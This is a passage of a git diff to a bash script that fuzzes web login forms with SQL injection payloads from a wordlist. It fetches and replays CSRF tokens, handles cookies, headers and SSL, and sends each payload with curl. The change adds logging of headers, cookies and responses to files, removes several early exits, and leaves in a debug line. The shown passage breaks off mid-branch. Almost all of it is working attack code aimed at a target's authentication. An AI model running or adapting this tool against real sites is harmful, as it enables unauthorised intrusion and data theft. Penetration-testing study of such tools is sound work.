@@ -4,7 +4,7 @@
 
 # Parsing Arguments
 
-while [[ $# -gt 0 && $# -lt 15 ]]; do
+while [[ $# -gt 0 && $# -lt 16 ]]; do
 
   case "$1" in
     -u|--url)
@@ -58,7 +58,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
       exit 1
       ;;
     -*|--*)
-      echo "$1 Required one parameter"
+      echo -e "$1 Required one parameter"
       exit 1
       ;;
 
@@ -66,7 +66,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
 
 done
 
-while [[ $# -gt 0 && $# -lt 15 ]]; do
+while [[ $# -gt 0 && $# -lt 16 ]]; do
 
     case $3 in
     -u|--url)
@@ -115,7 +115,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
       shift # past value
       ;;          
     -*|--*)
-      echo "$3 Required one parameter"
+      echo -e "$3 Required one parameter"
       exit 1
       ;;
         
@@ -123,7 +123,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
 
 done
 
-while [[ $# -gt 0 && $# -lt 15 ]]; do
+while [[ $# -gt 0 && $# -lt 16 ]]; do
 
     case $5 in
     -u|--url)
@@ -172,7 +172,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
       shift # past value
       ;;                     
     -*|--*)
-      echo "$5 Required one parameter"
+      echo -e "$5 Required one parameter"
       exit 1
       ;;
 
@@ -180,7 +180,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
 
 done
 
-while [[ $# -gt 0 && $# -lt 15 ]]; do
+while [[ $# -gt 0 && $# -lt 16 ]]; do
 
     case $7 in
     -u|--url)
@@ -229,7 +229,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
       shift # past value
       ;;                     
     -*|--*)
-      echo "$7 Required one parameter"
+      echo -e "$7 Required one parameter"
       exit 1
       ;;
 
@@ -237,7 +237,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
 
 done
 
-while [[ $# -gt 0 && $# -lt 15 ]]; do
+while [[ $# -gt 0 && $# -lt 16 ]]; do
 
     case $9 in
     -u|--url)
@@ -286,7 +286,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
       shift # past value
       ;;                  
     -*|--*)
-      echo "$9 Required one parameter"
+      echo -e "$9 Required one parameter"
       exit 1
       ;;
 
@@ -294,7 +294,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
 
 done
 
-while [[ $# -gt 0 && $# -lt 15 ]]; do
+while [[ $# -gt 0 && $# -lt 16 ]]; do
 
     case ${11} in
     -u|--url)
@@ -343,7 +343,7 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
       shift # past value
       ;;                     
     -*|--*)
-      echo "${11} Required one parameter"
+      echo -e "${11} Required one parameter"
       exit 1
       ;;
 
@@ -351,56 +351,56 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
 
 done
 
-while [[ $# -gt 0 && $# -lt 15 ]]; do
+while [[ $# -gt 0 && $# -lt 16 ]]; do
 
-    case ${12} in
+    case ${13} in
     -u|--url)
-      URL=${13}
+      URL=${14}
       shift # past argument
       shift # past value
       ;;
     -w|--wordlist)
-      WORDLIST=${13}
+      WORDLIST=${14}
       shift # past argument
       shift # past value
       ;;
     -r|--request)
-      LOGIN=${13}
+      LOGIN=${14}
       shift # past argument
       shift # past value
       ;;
     -c|--cookie)
-      cookie=${13}
+      cookie=${14}
       shift # past argument
       shift # past value
       ;;      
     -H|--header)
-      HEADER=${13}
+      HEADER=${14}
       shift # past argument
       shift # past value
       ;;
     -e|--error)
-      ERROR=${13}
+      ERROR=${14}
       shift # past argument
       shift # past value
       ;;
     -s|--ssl)
-      SSL=${13}
+      SSL=${14}
       shift # past argument
       shift # past value
       ;; 
     -C|--csrf)
-      CSRF=${13}
+      CSRF=${14}
       shift # past argument
       shift # past value
       ;;
     -v|--verbose)
-      VERBOSE=${12}
+      VERBOSE=${13}
       shift # past argument
       shift # past value
       ;;                     
     -*|--*)
-      echo "${12} Required one parameter"
+      echo -e "${13} Required one parameter"
       exit 1
       ;;
 
@@ -408,56 +408,56 @@ while [[ $# -gt 0 && $# -lt 15 ]]; do
 
 done
 
-while [[ $# -gt 0 && $# -lt 15 ]]; do
+while [[ $# -gt 0 && $# -lt 16 ]]; do
 
-    case ${14} in
+    case ${16} in
     -u|--url)
-      URL=${15}
+      URL=${16}
       shift # past argument
       shift # past value
       ;;
     -w|--wordlist)
-      WORDLIST=${15}
+      WORDLIST=${16}
       shift # past argument
       shift # past value
       ;;
     -r|--request)
-      LOGIN=${15}
+      LOGIN=${16}
       shift # past argument
       shift # past value
       ;;
     -c|--cookie)
-      cookie=${15}
+      cookie=${16}
       shift # past argument
       shift # past value
       ;;      
     -H|--header)
-      HEADER=${15}
+      HEADER=${16}
       shift # past argument
       shift # past value
       ;;
     -e|--error)
-      ERROR=${15}
+      ERROR=${16}
       shift # past argument
       shift # past value
       ;;
     -s|--ssl)
-      SSL=${15}
+      SSL=${16}
       shift # past argument
       shift # past value
       ;; 
     -C|--csrf)
-      CSRF=${15}
+      CSRF=${16}
       shift # past argument
       shift # past value
       ;;
     -v|--verbose)
-      VERBOSE=${14}
+      VERBOSE=${15}
       shift # past argument
       shift # past value
       ;;                     
     -*|--*)
-      echo "${14} Required one parameter"
+      echo -e "${15} Required one parameter"
       exit 1
       ;;
 
@@ -469,32 +469,27 @@ done
 
 if [[ "$URL" == '' ]]; then
 
-  echo "[-] URL is not specified, use -u or --url."
+  echo -e "[-] URL is not specified, use -u or --url."
   
-  exit
 
   if [[ "$LOGIN" == '' ]]; then
 
-    echo "[-] Request body is not specified, use -r|--request."
-    
-    exit
+    echo -e "[-] Request body is not specified, use -r|--request."
 
   fi
 
   if [[ "$ERROR" == '' ]]; then
 
-    echo "[-] Error message - Error response message isn't specified, use -e or --error."
+    echo -e "[-] Error message - Error response message isn't specified, use -e or --error."
     
-    exit
-
   fi
 
   if [[ "$WORDLIST" == '' ]]; then
 
-    echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
-        echo "[-] Please use single quotes and type -h or --help for usage."
+    echo -e "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
+    echo -e "[-] Please use single quotes and type -h or --help for usage."
     
-    exit
+  exit
 
   fi
 
@@ -502,23 +497,19 @@ fi
 
 if [[ "$LOGIN" == '' ]]; then
 
-  echo "[-] Request body is not specified, use -r|--request."
-  
-  exit
+  echo -e "[-] Request body is not specified, use -r|--request."
 
   if [[ "$ERROR" == '' ]]; then
 
-    echo "[-] Error message - Error response message isn't specified, use -e or --error."
-    
-    exit
+    echo -e "[-] Error message - Error response message isn't specified, use -e or --error."
 
   fi
 
   if [[ "$WORDLIST" == '' ]]; then
 
-    echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
-    
-    exit
+    echo -e "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
+
+  exit
 
   fi
     
@@ -527,15 +518,13 @@ fi
   
 if [[ "$ERROR" == '' ]]; then
 
-  echo "[-] Error message - Error response message isn't specified, use -e or --error."
-  
-  exit
+  echo -e "[-] Error message - Error response message isn't specified, use -e or --error."
 
   if [[ "$WORDLIST" == '' ]]; then
 
-    echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
-    
-    exit
+    echo -e "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
+
+  exit
 
   fi  
     
@@ -543,7 +532,7 @@ fi
     
 if [[ "$WORDLIST" == '' ]]; then
 
-  echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
+  echo -e "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
 
   exit  
 
@@ -551,7 +540,7 @@ fi
 
 if [[ "$SSL" != '' ]] && [[ "$SSL" != 'true' ]];then
 
-  echo "-s / --ssl must be set to true!"
+  echo -e "-s / --ssl must be set to true!"
   
   exit
 
@@ -563,113 +552,151 @@ function verbose(){
 
     if [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
       
-      REQUEST=$(curl -s -v -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")
-      echo "$REQUEST"
+      REQUEST=$(curl -D headers.txt -s -v -c "cookies.txt" -b "cookies.txt" -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
-      if [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
-        
-        REQUEST=$(curl -s -v -s "${URL}" --cookie "${Cookie}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
-        echo "$REQUEST"
+    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
+      
+      REQUEST=$(curl -D headers.txt -s -v -c "cookies.txt" -b "cookies.txt" -s "${URL}" --cookie "${Cookie}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
-      elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
-        echo "$REQUEST"
+    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -v -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
-      elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v -s -b -k "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} -H ${HEADER} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
-        echo "$REQUEST"
+    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -v -s -b -k "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} -H ${HEADER} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
-      elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
-        
-        REQUEST=$(curl -s -k -v 2>/tmp/curl-temp.txt -s "${URL}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
-        echo "$REQUEST"
+    elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
+      
+      REQUEST=$(curl -D headers.txt -s -k -c "cookies.txt" -b "cookies.txt" -v -s "${URL}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
-      elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
-        echo "$REQUEST"
-
-      fi
+    elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -v -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
     # Cookie is set with other arguments
 
     elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
       
-      REQUEST=$(curl -s -v -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
-      echo "$REQUEST"
+      REQUEST=$(curl -D headers.txt -s -v -c "cookies.txt" -b "cookies.txt" "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
-      if [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v -s -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
-        echo "$REQUEST"
+    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -v -s -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
-      elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v -s -k -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
-        echo "$REQUEST"
-
-      fi
+    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -v -s -k -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
     elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" == 'true' ]; then
       
-      REQUEST=$(curl -s -k -v -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")      
-      echo "$REQUEST"
+      REQUEST=$(curl -D headers.txt -s -k -c "cookies.txt" -b "cookies.txt" -v -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")      
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
     # CSRF is true with other arguments
 
     elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
         
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+        CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
         
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+        CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
         
-        REQUEST=$(curl -v -s -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
-        echo "$REQUEST"
+        REQUEST=$(curl -D headers.txt -v -s -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
-      if [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v -s -k -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
-        echo "$REQUEST"
+    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -v -s -k -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
-      fi
 
     # Only SSL is TRUE
 
     elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
       
-      REQUEST=$(curl -v -s -k "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
-      echo "$REQUEST"
+      REQUEST=$(curl -D headers.txt -v -s -c "cookies.txt" -b "cookies.txt" -k "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
 
     else
 
-      REQUEST=$(curl -v -s "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
-      echo "$REQUEST"   
+      REQUEST=$(curl -D headers.txt -v -c "cookies.txt" -b "cookies.txt" -s "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      echo -e "$REQUEST"
+      
+      response=$(echo -e $REQUEST > response.txt)
+      echo "TESTTTT"   
   fi
 
 }
@@ -689,7 +716,7 @@ while read -r wordlist; do
     ((i=i+1))
 
     # Feedback for user
-    echo "[-] Try ${i}: ${wordlist}"
+    echo -e "[-] Try ${i}: ${wordlist}"
 
     # Connect to server
 
@@ -703,130 +730,149 @@ while read -r wordlist; do
 
     if [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
       
-      REQUEST=$(curl -s -v 2>/tmp/curl-temp.txt -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")
-
-      if [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
-        
-        REQUEST=$(curl -s -v 2>/tmp/curl-temp.txt -s "${URL}" --cookie "${Cookie}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
-
-      elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
-
-      elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b -k "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} -H ${HEADER} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
-
-      elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
-        
-        REQUEST=$(curl -s -k -v 2>/tmp/curl-temp.txt -s "${URL}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
-
-      elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
-        
-        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
-        
-        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
-        
-        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      REQUEST=$(curl -D headers.txt -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")
       
-      fi
+      response=$(echo -e $REQUEST > response.txt)
 
+    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
+      
+      REQUEST=$(curl -D headers.txt -s "${URL}" --cookie "${Cookie}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      response=$(echo -e $REQUEST > response.txt)
+
+    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      response=$(echo -e $REQUEST > response.txt)
+      
+    elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
+      CSRF_REQ=$(curl -D headers.txt -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
+      
+      REQUEST=$(curl -D headers.txt -s -b -k "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} -H ${HEADER} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
+      
+      response=$(echo -e $REQUEST > response.txt)
+      
+    elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
+      
+      REQUEST=$(curl -D headers.txt -s -k "${URL}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
+      
+      response=$(echo -e $REQUEST > response.txt)
+      
+    elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
+      
+      CSRF_Name=$(curl -D headers.txt -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
+      
